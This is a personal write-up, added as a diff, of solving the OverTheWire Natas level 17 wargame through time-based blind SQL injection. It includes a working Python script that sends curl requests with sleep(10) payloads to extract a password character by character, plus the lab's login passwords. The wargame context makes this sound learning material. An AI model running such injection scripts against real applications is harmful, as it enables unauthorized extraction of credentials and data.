@@ -1,0 +1,56 @@
+This lab is the same as natas15 except you get no output regardless of what
+query you write. My first thought was again to try creating a union condition
+but this won't work since you get no output. Throwing an error in the query
+somehow seemed possible to me but mysql_query() just returns false for sql
+errors and we get no output anyway.
+
+After scratching my head for a few minutes I looked it up and came upon this
+link:
+
+https://www.abatchy.com/2016/12/natas-level-17
+
+This blogger has very thorough solutions to other labs also. He solved it using
+sleep(5) as his true flag. Meaning if his query hit's the sleep(5) condition he
+will know because the http request will take at least 5 seconds. I am going to
+try combining this fact with my old code from natas5. It should just take 32 * 5
+more seconds than it did before.
+
+Here is my code:
+
+import os
+import string
+import time
+
+request_count = 0
+chars = list(string.ascii_letters + string.digits)
+password = ""
+
+for i in range(32):
+    for char in chars:
+        print(f"{i} {char}")
+        guess = (i * "_") + char + ((32 - i - 1) * "_")
+        print(f"guess = {guess}")
+        command = "curl -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -d '"
+        command += f"username=natas18\" AND password LIKE BINARY \"{guess}\" "
+        command += "AND sleep(10) AND \"1\" = \"1"
+        command += "' http://natas17.natas.labs.overthewire.org/index.php"
+        start_time = time.time() # time.time() returns time in seconds
+        output = os.popen(command).read()
+        end_time = time.time()
+        if(end_time - start_time >= 9.99):
+            password += char
+            break
+        if(char == "9"):
+            raise Exception(f"Error: could not determine {i}th character")
+        request_count += 1
+
+print(f"Executed {request_count} curl commands.")
+print(f"Final Password = {password}")
+
+I had to increase the sleep time from 5 to 10 seconds. My very slow wifi network
+caused some false positives because the latency was more than 5 seconds so my
+program thought this meant that the select query reached the sleep(5) condition
+when this wasn't the case. My program took 10 minutes and 19 seconds to execute
+820 curl commands. 
+
+natas18 password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
